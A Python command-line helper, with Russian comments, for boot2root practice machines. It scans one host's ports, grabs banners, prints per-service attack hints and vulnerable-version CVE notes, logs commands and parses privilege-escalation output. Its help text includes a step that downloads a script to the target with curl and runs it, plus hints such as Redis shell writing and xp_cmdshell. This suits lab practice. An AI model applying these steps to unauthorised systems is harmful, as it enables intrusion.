#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ctb.py — помощник для практических машин (boot2root) на СВОЁМ стенде.

  python ctb/ctb.py recon HOST [--ports 21,22,80] [--timeout 1.5] [--out r.json]
  python ctb/ctb.py plan r.json
  python ctb/ctb.py log add "nmap ..." --result ok --note "порт 80"
  python ctb/ctb.py log show
  python ctb/ctb.py privesc                 # как залить и запустить privesc.sh
  python ctb/ctb.py privesc privesc.txt     # разобрать сохранённый вывод

Сеть — только подкоманда recon и только к одному указанному хосту
(диапазоны/CIDR запрещены). Остальное работает офлайн.
"""
from __future__ import annotations

import argparse
import json
import os
import re
import socket
import sys
import time
from concurrent.futures import ThreadPoolExecutor

for _s in (sys.stdout, sys.stderr):
    try:
        _s.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))

DEFAULT_PORTS = [21, 22, 23, 25, 53, 80, 110, 111, 139, 143, 443, 445, 993,
                 995, 1433, 2049, 3000, 3306, 3389, 5432, 5900, 6379, 8000,
                 8080, 8443, 8888, 9200, 27017]
LOG_FILE = os.environ.get("CTB_LOG", "ctb_log.jsonl")

# порт -> (сервис, подсказка)
SERVICES = {
    21: ("ftp", "FTP: anonymous/anonymous; ls, get всё; проверь запись (put)."),
    22: ("ssh", "SSH: найденные логины/ключи; ручная проверка слабых паролей; версия -> user enum."),
    23: ("telnet", "Telnet: баннер, ручная проверка дефолтных учёток."),
    25: ("smtp", "SMTP: VRFY/EXPN для перечисления пользователей."),
    53: ("dns", "DNS: axfr по имени домена, подбор поддоменов."),
    80: ("http", "HTTP: robots.txt, перебор директорий, исходники, CMS/версия, vhost."),
    110: ("pop3", "POP3: логин найденными данными, чтение почты."),
    111: ("rpcbind", "rpcbind: rpcinfo -p, смотри nfs/mountd."),
    139: ("smb", "SMB: список шар без пароля, null session."),
    143: ("imap", "IMAP: логин найденными данными."),
    443: ("https", "HTTPS: как HTTP + сертификат (CN/SAN -> vhost)."),
    445: ("smb", "SMB: шары (guest/null), чтение файлов, версия Samba."),
    993: ("imaps", "IMAPS: как IMAP."),
    995: ("pop3s", "POP3S: как POP3."),
    1433: ("mssql", "MSSQL: ручная проверка дефолтных учёток, xp_cmdshell при доступе."),
    2049: ("nfs", "NFS: showmount -e, монтирование шар, no_root_squash."),
    3000: ("http-alt", "Веб на 3000: как HTTP (часто Node/Grafana)."),
    3306: ("mysql", "MySQL: ручная проверка пустого root/дефолтных учёток; потом FILE/UDF."),
    3389: ("rdp", "RDP: найденные учётки; версия."),
    5432: ("postgres", "PostgreSQL: дефолтные учётки вручную; COPY ... PROGRAM."),
    5900: ("vnc", "VNC: проверка отсутствия пароля / слабого пароля."),
    6379: ("redis", "Redis: INFO без auth; CONFIG SET dir/dbfilename -> запись ключа/шелла."),
    8000: ("http-alt", "Веб на 8000: как HTTP."),
    8080: ("http-alt", "Веб на 8080: как HTTP (Tomcat/Jenkins: консоль управления)."),
    8443: ("https-alt", "Веб на 8443: как HTTPS."),
    8888: ("http-alt", "Веб на 8888: как HTTP (Jupyter?)."),
    9200: ("elasticsearch", "Elasticsearch: /_cat/indices, данные без auth."),
    27017: ("mongodb", "MongoDB: доступ без auth, список баз, дефолтные учётки вручную."),
}
HTTP_PORTS = {80, 3000, 8000, 8080, 8888}
HTTPS_PORTS = {443, 8443}

# (regex по баннеру, заметка) — короткая офлайн-таблица
VERSION_NOTES = [
    (r"vsftpd 2\.3\.4", "vsFTPd 2.3.4 — известная бэкдор-версия (смайлик в логине, порт 6200)."),
    (r"proftpd 1\.3\.[35]", "ProFTPD 1.3.3-1.3.5 — mod_copy (SITE CPFR/CPTO)."),
    (r"openssh[_ ]([1-6]\.|7\.[0-6])", "Старый OpenSSH — возможен user enumeration (CVE-2018-15473)."),
    (r"apache/2\.4\.49", "Apache 2.4.49 — path traversal/RCE (CVE-2021-41773)."),
    (r"apache/2\.4\.50", "Apache 2.4.50 — path traversal/RCE (CVE-2021-42013)."),
    (r"samba 3\.", "Samba 3.x — usermap_script (CVE-2007-2447)."),
    (r"exim 4\.8[7-9]|exim 4\.9[0-1]", "Exim 4.87-4.91 — возможен RCE (CVE-2019-10149)."),
    (r"redis[ _]server v?[0-4]\.", "Старый Redis — без auth возможна запись файлов через CONFIG."),
    (r"iis/[1-7]\.", "Старый IIS — проверь WebDAV/известные эксплойты."),
]


def note_for(banner: str):
    b = (banner or "").lower()
    return [n for rx, n in VERSION_NOTES if re.search(rx, b)]


def _validate_host(host: str):
    if not host or any(c in host for c in "/, *") or ".." in host:
        raise ValueError("только один хост, без диапазонов/CIDR")
    if re.fullmatch(r"[\d.]+-[\d.]+", host):
        raise ValueError("диапазоны запрещены")


def parse_ports(s):
    if not s:
        return list(DEFAULT_PORTS)
    out = []
    for p in s.split(","):
        p = p.strip()
        if not p:
            continue
        if "-" in p:
            a, b = p.split("-", 1)
            if int(b) - int(a) > 1024:
                raise ValueError("слишком широкий диапазон портов")
            out += list(range(int(a), int(b) + 1))
        else:
            out.append(int(p))
    return sorted({p for p in out if 0 < p < 65536})


def grab(host, port, timeout):
    """None если порт закрыт, иначе (True, баннер)."""
    try:
        s = socket.create_connection((host, port), timeout=timeout)
    except OSError:
        return None
    banner = b""
    try:
        s.settimeout(timeout)
        try:
            banner = s.recv(512)
        except OSError:
            banner = b""
        if not banner and port not in HTTPS_PORTS:
            # молчащий сервис: пробуем HTTP-запрос (веб на нестандартном порту)
            try:
                s.sendall(b"GET / HTTP/1.0\r\n\r\n")
                banner = s.recv(512)
            except OSError:
                banner = b""
    finally:
        try:
            s.close()
        except OSError:
            pass
    return True, banner.decode("latin-1", "replace").strip()


def http_info(host, port, timeout, tls=False):
    info = {}
    try:
        import requests
        import urllib3
        urllib3.disable_warnings()
        base = f"{'https' if tls else 'http'}://{host}:{port}"
        r = requests.get(base + "/", timeout=timeout, verify=False,
                         allow_redirects=False)
        info["status"] = r.status_code
        info["server"] = r.headers.get("Server", "")
        m = re.search(r"<title[^>]*>(.*?)</title>", r.text, re.I | re.S)
        info["title"] = m.group(1).strip() if m else ""
        try:
            rb = requests.get(base + "/robots.txt", timeout=timeout,
                              verify=False, allow_redirects=False)
            if rb.status_code == 200:
                info["robots"] = rb.text[:2000]
        except Exception:
            pass
    except Exception as e:
        info["error"] = str(e)[:120]
    return info


def recon(host, ports, timeout=1.5, workers=32):
    _validate_host(host)
    results = {}

    def one(p):
        g = grab(host, p, timeout)
        if g is None:
            return
        banner = g[1]
        svc, hint = SERVICES.get(p, ("unknown", "Неизвестный сервис: nc и посмотри баннер."))
        if svc == "unknown":
            if banner.startswith("HTTP/"):
                svc, hint = "http", SERVICES[80][1]
            elif banner.startswith("SSH-"):
                svc, hint = "ssh", SERVICES[22][1]
            elif banner.startswith("220") and "ftp" in banner.lower():
                svc, hint = "ftp", SERVICES[21][1]
            elif banner.startswith("220") and "smtp" in banner.lower():
                svc, hint = "smtp", SERVICES[25][1]
        e = {"port": p, "service": svc, "banner": banner, "hints": [hint]}
        if p in HTTP_PORTS or p in HTTPS_PORTS or banner.startswith("HTTP/") or svc == "http":
            e["http"] = http_info(host, p, max(timeout, 3), tls=p in HTTPS_PORTS)
            if e["http"].get("server"):
                banner = banner + " " + e["http"]["server"]
        e["notes"] = note_for(banner)
        results[p] = e

    with ThreadPoolExecutor(max_workers=max(1, min(workers, 64))) as ex:
        list(ex.map(one, ports))
    return {"host": host, "time": time.strftime("%Y-%m-%dT%H:%M:%S"),
            "scanned": len(ports),
            "open": [results[p] for p in sorted(results)]}


def make_plan(rep):
    lines = [f"Чек-лист для {rep.get('host')}:"]
    n = 1
    opn = rep.get("open", [])
    if not opn:
        return lines[0] + "\n  нет открытых портов из списка — расширь --ports"
    prio = {"ftp": 0, "http": 1, "https": 1, "http-alt": 1, "smb": 2, "nfs": 2}
    for e in sorted(opn, key=lambda e: (prio.get(e["service"], 5), e["port"])):
        head = f"{e['port']}/{e['service']}"
        if e.get("banner"):
            head += f"  [{e['banner'][:60]}]"
        lines.append(f"{n}. {head}")
        for h in e.get("hints", []):
            lines.append(f"     - {h}")
        for x in e.get("notes", []):
            lines.append(f"     ! {x}")
        h = e.get("http") or {}
        if h.get("title"):
            lines.append(f"     - title: {h['title']}")
        if h.get("robots"):
            lines.append("     - robots.txt: " + h["robots"].strip().replace("\n", " | ")[:200])
        n += 1
    lines.append(f"{n}. Получив шелл: python ctb/ctb.py privesc  (залить linux/privesc.sh)")
    n += 1
    lines.append(f"{n}. Всё записывай: python ctb/ctb.py log add \"команда\" --note ...")
    return "\n".join(lines)


# ---------------- журнал ----------------
def log_add(command, result="", note=""):
    rec = {"time": time.strftime("%Y-%m-%dT%H:%M:%S"), "command": command,
           "result": result, "note": note}
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(json.dumps(rec, ensure_ascii=False) + "\n")
    return rec


def log_show():
    if not os.path.isfile(LOG_FILE):
        print("(журнал пуст)")
        return
    with open(LOG_FILE, encoding="utf-8", errors="replace") as f:
        for line in f:
            try:
                r = json.loads(line)
            except ValueError:
                continue
            print(f"{r.get('time')}  $ {r.get('command')}  -> {r.get('result')}"
                  + (f"  # {r['note']}" if r.get("note") else ""))


# ---------------- privesc ----------------
PRIVESC_HOWTO = """Как запустить linux/privesc.sh на цели (скрипт только читает):
  1. У себя:   python -m http.server 8000 --directory linux
  2. На цели:  curl http://<мой_ip>:8000/privesc.sh -o /tmp/p.sh
               (или wget, или nc / scp / base64-вставка)
  3. На цели:  bash /tmp/p.sh | tee /tmp/privesc.txt
  4. Забери вывод и разбери:  python ctb/ctb.py privesc privesc.txt
Дальше: python linux/gtfobins.py --check "<бинари>"
"""

KERNEL_NOTES = [
    (r"^[23]\.", "Старое ядро 2.6/3.x — DirtyCow (CVE-2016-5195) и др."),
    (r"^4\.", "Ядро 4.x — проверь DirtyCow/overlayfs/eBPF-эксплойты по версии."),
    (r"^5\.(8|9|1[0-5])\.", "Ядро 5.8-5.15 — DirtyPipe (CVE-2022-0847) возможен до 5.16.11."),
]
SUID_COMMON = {"su", "sudo", "passwd", "mount", "umount", "ping", "chsh", "chfn",
               "newgrp", "gpasswd", "pkexec", "fusermount", "fusermount3",
               "ssh-keysign", "dbus-daemon-launch-helper", "polkit-agent-helper-1"}


def _sections(text):
    secs, cur = {}, "head"
    for line in text.splitlines():
        m = re.match(r"=+\s*(\d+)\.\s*(.*?)\s*=+\s*$", line)
        if m:
            cur = m.group(1)
            secs[cur] = []
        else:
            secs.setdefault(cur, []).append(line)
    return secs


def parse_privesc(text):
    secs = _sections(text)
    out = {"suid": [], "suid_unusual": [], "sudo": [], "cron": [],
           "capabilities": [], "kernel": "", "notes": []}
    for l in secs.get("1", []):
        m = re.match(r"Linux \S+ (\d+\.\d+[\w.\-+]*)", l)
        if m:
            out["kernel"] = m.group(1)
            for rx, n in KERNEL_NOTES:
                if re.search(rx, m.group(1)):
                    out["notes"].append(n)
                    break
    for l in secs.get("2", []):
        s = l.strip()
        if "NOPASSWD" in s or re.match(r"\(.*\)\s+ALL", s):
            out["sudo"].append(s)
    for l in secs.get("3", []):
        s = l.strip()
        if s.startswith("/"):
            out["suid"].append(s)
            if os.path.basename(s) not in SUID_COMMON:
                out["suid_unusual"].append(s)
    for l in secs.get("4", []):
        s = l.strip()
        if s.startswith("/") and "=" in s:
            out["capabilities"].append(s)
    for l in secs.get("5", []):
        s = l.strip()
        if "writable" in s.lower() or re.match(r"^[-d][rwx-]{5}w", s):
            out["cron"].append(s)
    return out


def print_privesc(res):
    print("Находки privesc:")
    print(f"  ядро: {res['kernel'] or '?'}")
    for n in res["notes"]:
        print(f"    ! {n}")
    for s in res["sudo"]:
        print(f"  sudo: {s}   -> gtfobins.py --check <бинарь>")
    for s in res["suid_unusual"]:
        print(f"  SUID (необычный): {s}   -> gtfobins.py --check {os.path.basename(s)}")
    print(f"  SUID всего: {len(res['suid'])}")
    for s in res["capabilities"]:
        print(f"  capability: {s}")
    for s in res["cron"]:
        print(f"  cron (писабельно): {s}")


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = ap.add_subparsers(dest="cmd")
    r = sub.add_parser("recon")
    r.add_argument("host")
    r.add_argument("--ports", help="список/диапазоны: 21,22,80,8000-8010")
    r.add_argument("--timeout", type=float, default=1.5)
    r.add_argument("--workers", type=int, default=32)
    r.add_argument("--out")
    p = sub.add_parser("plan")
    p.add_argument("report")
    lg = sub.add_parser("log")
    lg.add_argument("action", choices=["add", "show"])
    lg.add_argument("command", nargs="?")
    lg.add_argument("--result", default="")
    lg.add_argument("--note", default="")
    v = sub.add_parser("privesc")
    v.add_argument("file", nargs="?")
    a = ap.parse_args()

    try:
        if a.cmd == "recon":
            rep = recon(a.host, parse_ports(a.ports), a.timeout, a.workers)
            txt = json.dumps(rep, ensure_ascii=False, indent=2)
            if a.out:
                with open(a.out, "w", encoding="utf-8") as f:
                    f.write(txt)
            print(txt)
        elif a.cmd == "plan":
            with open(a.report, encoding="utf-8", errors="replace") as f:
                print(make_plan(json.load(f)))
        elif a.cmd == "log":
            if a.action == "show":
                log_show()
            else:
                if not a.command:
                    print("[-] нужна команда: log add \"cmd\"")
                    return 2
                log_add(a.command, a.result, a.note)
                print("[+] записано")
        elif a.cmd == "privesc":
            if not a.file:
                print(PRIVESC_HOWTO)
            else:
                with open(a.file, encoding="utf-8", errors="replace") as f:
                    print_privesc(parse_privesc(f.read()))
        else:
            ap.print_help()
    except (FileNotFoundError, IsADirectoryError, PermissionError) as e:
        print(f"[-] {e}")
        return 1
    except (ValueError, json.JSONDecodeError) as e:
        print(f"[-] {e}")
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
